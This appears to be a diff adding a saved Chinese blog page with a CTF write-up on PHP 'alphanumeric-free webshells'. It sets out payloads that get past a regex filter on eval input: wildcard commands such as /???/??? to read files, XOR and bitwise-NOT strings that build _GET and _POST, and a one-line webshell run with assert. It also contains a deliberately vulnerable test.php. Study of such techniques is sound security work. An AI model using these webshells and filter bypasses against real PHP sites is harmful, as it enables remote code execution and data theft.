@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="向前!向前!">
+    
+    <meta name="description" content="nice">
+    
+    
+    
+    
+    
+    
+    <title>无字母数字webshell+极限利用 | 向前!向前!</title>
+    <link href=”http://yoursite.com“ rel=”prefetch” />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="http://yoursite.com" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/about" class="menuItem" style="left: 50%; top: 85%;">关于</a>
+            <a href="/message" class="menuItem" style="left: 19.6891%; top: 67.5%;">留言板</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
+        </div>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://yoursite.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">向前~</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/categories">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                </li>
+                
+                
+                
+                
+                
+                <li class="">
+                    <a href="/tags">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://yoursite.com">向前!向前!</a>
+        >
+        <span>无字母数字webshell+极限利用</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/11/12/webshell(1)/">无字母数字webshell+极限利用</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-11-12
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/11/12/webshell(1)/">无字母数字webshell+极限利用</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-11-12
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>##安恒杯babybypass writeup<br><img src="https://upload-images.jianshu.io/upload_images/9202951-79037b5fd6f7e526.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这题拿到后见很熟悉就用paylaod直接做，结果做不出来，原来跟之前的不一样，$也被过滤了，使用php不用字母数字下划线写shell的方法不管用了，不过有大佬用其他方法做出来了</p>
+<p>巧妙地利用linux下的通配符<br>这里也是很有技巧的点，在Linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：<br>linux下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??? =&gt; /bin/cat</span><br></pre></td></tr></table></figure></p>
+<p>问题来了，知道通配符能找到目录，但怎么执行命令取回结果呢？要想得到读文件或者命令执行的内容，我们需要一个用来输出的东西，但是我们又没有常规的函数，经过了一段时间的思考，想到了&lt;?=$_?&gt;，这个方式。<br>&lt;?= 就相当于php中的echo , 在linux下， 例如echo ls 执行ls命令<br>我们找到了这个关键的正则，我们先来读一下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;</span><br><span class="line">&quot;/bin/cat /var/www/html/index.php&quot;</span><br></pre></td></tr></table></figure></p>
+<p>但是发现超出长度了，然后我们继续缩短长度，想到了用*来匹配文件夹下的所有文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/*`;?&gt;&lt;?=$_?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是$和_ 被过滤了<br>?&gt; 是为了闭合前面的code然后去执行后面的php语句<br>改进为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-8c1cf019c2d0264d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>发现关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">    $flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们知道了flag的文件位置在根目录，所以直接利用通配符去读flag文件就好</p>
+<p>?&gt;&lt;?=<code>/???/???%20/????</code>;?&gt;<br><a href="http://101.71.29.5:10001/?code=?&gt;" target="_blank" rel="noopener">http://101.71.29.5:10001/?code=?&gt;</a>&lt;?=<code>/???/???%20/????</code>;?&gt;<br><img src="https://upload-images.jianshu.io/upload_images/9202951-4ce3444612a82964.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>##参考<br><a href="https://blog.csdn.net/weixin_42815001/article/details/81515427" target="_blank" rel="noopener">一些不包含数字和字母的webshell之方法一</a></p>
+<p><a href="https://www.cnblogs.com/nul1/p/9437127.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p>
+<p><a href="https://www.lin2zhen.top/2018/06/26/ctf/#more" target="_blank" rel="noopener">安恒杯月赛writeup</a></p>
+<p><a href="https://www.aqbeta.com/data/201808/153380340813497.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">CTF题目思考–极限利用</a></p>
+<p>##参考学习 一</p>
+<p>###这里我们先自己写一个test.php 和 flag.php 用于测试<br><a href="https://blog.csdn.net/a15803617402/article/details/83589181" target="_blank" rel="noopener">无字母无数字webshell</a><br>以下内容为对 上面这篇博客的学习<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    echo($code);</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   // @eval($code); </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function getFlag()&#123;</span><br><span class="line">		$flag = &quot;111111111111111111&quot;;</span><br><span class="line">		echo $flag;</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>####在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<p>###尝试构造</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-bf2eeb1c44034ea5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    var_dump(&apos;#&apos;^&apos;|&apos;); //得到字符 _</span><br><span class="line">    echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">    var_dump(&apos;.&apos;^&apos;~&apos;); //得到字符 P</span><br><span class="line">    echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">	var_dump(&apos;/&apos;^&apos;`&apos;); //得到字符 0</span><br><span class="line">	echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">	var_dump(&apos;|&apos;^&apos;/&apos;); //得到字符 S</span><br><span class="line">	echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">	var_dump(&apos;&#123;&apos;^&apos;/&apos;); //得到字符 T</span><br><span class="line">	echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">	$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</span><br><span class="line">	echo($__)</span><br><span class="line">	//变量$__值为字符串&apos;_POST&apos;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>浏览器解析后<br><img src="https://upload-images.jianshu.io/upload_images/9202951-bc5c85bf1158758b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h4 id="2webshell-php"><a href="#2webshell-php" class="headerlink" title="2webshell.php"></a>2webshell.php</h4><p><img src="https://upload-images.jianshu.io/upload_images/9202951-7721d8a9823e573d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//@是为了抑制错误显示</span><br><span class="line">@$_++; //$_=NULL=0  $_++=1</span><br><span class="line">echo(!$_);</span><br><span class="line">echo(&quot;&lt;br&gt;&quot;);</span><br><span class="line">echo($_);</span><br><span class="line">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;); //_POST</span><br><span class="line">//$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-3d5006b8c6b155f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>执行一下webshell.php<br><img src="https://upload-images.jianshu.io/upload_images/9202951-38f7e5e025e2b847.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>####为了节省字符长度，这里字符可以一起异或使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;#./|&#123;&quot;^&quot;|~`//&quot;); //_POST</span><br><span class="line">var_dump(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;); //_GET</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>webshell01<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_++;</span><br><span class="line">$__=&apos;#./|&#123;&apos;^&apos;|~`//&apos;;</span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line">?&gt;</span><br><span class="line">执行一下webshell01</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-cc06cdd9cca79133.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>##构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;                         //_GET</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);                    //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=getFlag                           //执行函数 eval(&quot;getFlag(null)&quot;)</span><br><span class="line"></span><br><span class="line">payload如下</span><br><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-7d353a21684d393b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-50c711bc051c2028.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>但是字符串大于四十?</p>
+<p>输出一下$_GET[‘code’]<br><img src="https://upload-images.jianshu.io/upload_images/9202951-1de1773570b6529f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>哎哟  肯定少于四十了</p>
+<p>成功得到flag<br><img src="https://upload-images.jianshu.io/upload_images/9202951-7472c0f1cc26641b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>再执行一下webshell试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-eb14c9c33c271703.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>###方法二<br>如果在加上不能有&amp;_字符呢？</p>
+<p>只要eval函数执行了“getFlag()”字符串即可，那么绕过正则匹配即可：</p>
+<p>把getFlag取反然后URL编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure></p>
+<p>这里为什么正则没有检测到，因为后端自动进行了解码，解码为非字母和数字字符，而eval执行了取反还原为getFlag字符<br><img src="https://upload-images.jianshu.io/upload_images/9202951-a23340b6ad1af78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>既然可以利用取反~进行编码绕过正则检测，那么也可以取反编_GET  ,_POST</p>
+<h2 id="参考学习-二"><a href="#参考学习-二" class="headerlink" title="参考学习 二"></a>参考学习 二</h2><p><a href="https://blog.csdn.net/weixin_42815001/article/details/81515427" target="_blank" rel="noopener">一些不包含数字和字母的webshell之方法一</a><br>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //pre_match（code长度很长可以绕过）</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function getFlag()&#123;</span><br><span class="line">		$flag = &quot;111111111111111111&quot;;</span><br><span class="line">		echo $flag;</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>###思路 (一)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造一个变量_ 变量的值为_GET 执行$_GET[]($_GET[])</span><br></pre></td></tr></table></figure></p>
+<p>我们是要用非字母、数字的字符经过各种变化，最后能构造出我们所需要的字符，然后利用php允许动态函数执行的特点，拼接一个函数名</p>
+<p>####payload-one</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-2dbe6b66b2c07ef0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>下划线被过滤了  所以payload-one失效</p>
+<p>####payload-two<br><img src="https://upload-images.jianshu.io/upload_images/9202951-88565a09a5acd6f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-f4bac1560ddf2aab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9202951-894791f87282ac58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;!&quot;^&quot;~&quot;&#125;=&quot;]%];,&lt;&lt;&quot;^&quot;:@)&#125;@][&quot;;$&#123;&quot;!&quot;^&quot;~&quot;&#125;();</span><br><span class="line"> $_=getFlag;_();</span><br></pre></td></tr></table></figure></p>
+<p>构造一个变量_ 变量的值为 getFlag 执行 __();<br>总的来说，是要传进去两个参数t和code 会执行 @eval($code) 但是code限制了传进去的长度不能超过50，而且会进行正则匹配 pre_match()<br>这里正则匹配禁用了大写A-Z，小写A-Z,数字0-9，以及下划线_, 我们看到可以通过调用getFLAG来得到flag </p>
+<p>####在php中，两个字符串执行异或操作后，得到的还是一个字符串，我们想到可以用两个非字母、数字的字符，他们异或得到我们所需要的字母。 </p>
+<p>这里我们先了解一下异或(^)的概念<br>异或两个字母 首先把他们转化成ASCII码值 这里有python的两个函数特别好用 </p>
+<p>####chr()函数<br>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符<br>chr(i)<br>参数   (i)    可以是10进制也可以是16进制的形式的数字<br>返回值     返回值是当前整数对应的ascii字符</p>
+<p>####ord()函数<br>ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常</p>
+<p>ord(c)  参数 c 是字符<br>返回值是对应的十进制整数</p>
+<p>ord(“A”) 字母转ASCII char(65) ASCII转字母 </p>
+<p>A的ASCII值是65，对应的二进制值是01000001<br>?的ASCII值是63，对应的二进制值是00111111<br>异或的二进制的值是10000000，对应的ASCII值是126，对应的字符串的值就是~了<br><img src="https://upload-images.jianshu.io/upload_images/9202951-4a883836c39d66d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png">​    </p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            向前!向前!
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>nice</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/12/webshell(1)/">无字母数字webshell+极限利用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/uhadoop3(2)/">ubuntu16.04安装hadoop3.02(伪分布式)+集群</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/uhadoop3(1)/">ubuntu16.04安装hadoop3.02(单机模式)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/dvwa_xss(dom)/">Dvwa-xss(DOM)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/04/hello-world/">Hello World</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/dvwa_xss(dom)/">Dvwa-xss(DOM)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/04/hello-world/">Hello World</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/12/webshell(1)/">无字母数字webshell+极限利用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/uhadoop3(1)/">ubuntu16.04安装hadoop3.02(单机模式)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/uhadoop3(2)/">ubuntu16.04安装hadoop3.02(伪分布式)+集群</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                <li class="">
+                    <a href="/2018/11/12/webshell(1)/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                <li class="">
+                    <a href="/2018/11/12/webshell(1)/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                <li class="">
+                    <a href="/2018/11/12/webshell(1)/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+</div>
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://47.93.6.132/wordpress/" target="_blank">向前</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/emmmliuxq" target="_blank">Github</a>
